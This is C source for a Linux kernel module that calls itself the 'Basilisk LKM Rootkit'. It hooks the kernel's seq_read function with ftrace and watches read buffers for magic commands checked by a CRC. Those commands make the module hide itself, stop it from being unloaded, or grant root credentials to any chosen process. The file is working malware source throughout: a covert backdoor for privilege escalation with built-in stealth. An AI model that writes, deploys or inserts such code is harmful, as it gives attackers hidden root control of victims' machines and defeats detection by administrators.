#include "include/main.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Skelly");
MODULE_DESCRIPTION("Basilisk LKM Rootkit");
MODULE_VERSION("2.5");

/* Extract the signal, pid and CRC from the given buffer */
void extract_components(char *buf, uint8_t *sig, pid_t *pid, uint32_t *crc) {
  *sig = (uint8_t)buf[0]; // first byte (command)
  memcpy(pid, buf + PID_OFFSET, PID_SIZE);
  memcpy(crc, buf + CRC_OFFSET, CRC_SIZE);
}

/* Executes appropriate functions based on given signal. pid is meant to be used
 * with signal SIG_ROOT */
void sig_handle(const uint32_t sig, pid_t pid) {
  switch (sig) {
  case SIG_HIDE:
    handle_lkm_hide();
    break;

  case SIG_PROTECT:
    handle_lkm_protect();
    break;

  case SIG_GOD:
    handle_lkm_hide();
    handle_lkm_protect();
    break;

  case SIG_ROOT:
    set_root(pid);
    break;

  default:
    break;
  }
}

/*
static const struct proc_ops kallsyms_proc_ops = {
        .proc_open	= kallsyms_open,
        .proc_read	= seq_read, <-- This is our target
        .proc_lseek	= seq_lseek,
        .proc_release	= seq_release_private,
};
*/
asmlinkage ssize_t (*orig_seq_read)(struct file *file, char __user *buf,
                                    size_t size, loff_t *ppos);
asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf,
                                 size_t size, loff_t *ppos) {
  char *kbuf;
  long error;

  uint8_t sig;
  pid_t pid;
  uint32_t extracted_crc;

  kbuf = kmalloc(size, GFP_KERNEL);
  if (!kbuf) {
    return orig_seq_read(file, buf, size, ppos);
  }

  error = copy_from_user(kbuf, buf, size);
  if (error) {
    kfree(kbuf);
    return orig_seq_read(file, buf, size, ppos);
  }

  if (size < TOTAL_SIZE) {
    kfree(kbuf);
    return orig_seq_read(file, buf, size, ppos);
  }

  extract_components(kbuf, &sig, &pid, &extracted_crc);

  if (!is_valid_crc(kbuf, extracted_crc, CRC_OFFSET)) {
    kfree(kbuf);
    return orig_seq_read(file, buf, size, ppos);
  }
  sig_handle(sig, pid);

  kfree(kbuf);
  return orig_seq_read(file, buf, size, ppos);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    // HOOK("sys_openat", hook_openat, &orig_openat, true), // include/king.h
    HOOK("seq_read", hook_seq_read, &orig_seq_read, false),
};

/* Module initialization function */
static int __init basilisk_init(void) {
  int err;

  init_this_kobj(); // initialize this_kobj utility struct in stealth_helper.h
  /* Hook the syscall and print to the kernel buffer */
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err)
    return err;

  pr_info("basilisk: loaded\n");
  return 0;
}

static void __exit basilisk_exit(void) {
  kfree(king_fops); // free king_fops
  /* Unhook and restore the syscalls */
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "basilisk: unloaded\n");
}

module_init(basilisk_init);
module_exit(basilisk_exit);